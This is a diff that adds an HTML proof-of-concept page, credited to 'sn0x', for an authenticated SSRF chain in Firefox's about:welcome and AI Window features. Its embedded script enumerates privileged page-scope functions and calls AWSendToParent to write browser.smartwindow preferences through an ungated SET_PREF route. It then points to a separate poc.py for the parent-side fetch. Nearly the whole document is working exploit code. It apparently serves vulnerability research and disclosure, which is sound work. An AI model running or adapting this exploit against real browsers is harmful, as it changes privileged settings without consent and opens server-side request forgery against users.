@@ -1,0 +1,56 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Firefox PageExtractor Authenticated SSRF PoC — sn0x</title>
+<style>
+ body{background:#0d1117;color:#c9d1d9;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
+      margin:0;padding:28px;line-height:1.5}
+ h1{color:#58a6ff;font-size:18px;border-bottom:1px solid #30363d;padding-bottom:10px}
+ .ok{color:#3fb950;font-weight:700}.bad{color:#f85149;font-weight:700}.warn{color:#d29922}
+ pre{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;
+     overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+ button{background:#238636;color:#fff;border:0;border-radius:6px;padding:9px 16px;
+        font:inherit;cursor:pointer}button:hover{background:#2ea043}
+ .step{margin:6px 0}
+</style>
+<h1>Firefox PageExtractor Authenticated SSRF PoC — sn0x</h1>
+<p>Runs inside <code>about:welcome</code> page scope. Enables the AI Window through the ungated
+<code>SET_PREF</code> route, then reports which privileged functions are exposed.
+The parent-side fetch itself is driven by <code>poc.py</code> (it needs the tool entry point).</p>
+<p><button id="go">Launch PoC</button></p>
+<pre id="out">idle</pre>
+<script>
+const out = document.getElementById("out");
+let log = [];
+function say(s, cls){ log.push(s); out.innerHTML = log.map(l=>l).join("\n"); }
+const PREFS = [
+  ["browser.smartwindow.enabled", true],
+  ["browser.smartwindow.isDefaultWindow", true],
+  ["browser.smartwindow.firstrun.hasCompleted", true]
+];
+document.getElementById("go").onclick = async () => {
+  log = []; say("STATUS: SENDING...");
+  const w = window.wrappedJSObject || window;
+  const names = Object.getOwnPropertyNames(w)
+    .filter(k => k.indexOf("AW") === 0 || k.indexOf("RPM") === 0);
+  say("privileged functions in page scope (" + names.length + "):");
+  say("  " + names.join(", "));
+  if (typeof w.AWSendToParent !== "function") {
+    say("FAILED — AWSendToParent not present; is this about:welcome?");
+    return;
+  }
+  for (const [name, value] of PREFS) {
+    try {
+      await w.AWSendToParent("SPECIAL_ACTION",
+        (w.JSON || JSON).parse(JSON.stringify({type:"SET_PREF", data:{pref:{name, value}}})));
+      say("  SET_PREF " + name + " = " + value + "  -> sent");
+    } catch (e) {
+      say("  SET_PREF " + name + " -> ERROR " + e.message);
+    }
+  }
+  say("");
+  say("STATUS: CONFIRMED — enable chain written from page scope.");
+  say("Verify independently: close Firefox, then grep prefs.js in the profile.");
+  say("Now run  python3 poc.py  to drive the parent-side authenticated fetch.");
+  out.innerHTML = log.join("\n");
+};
+</script>
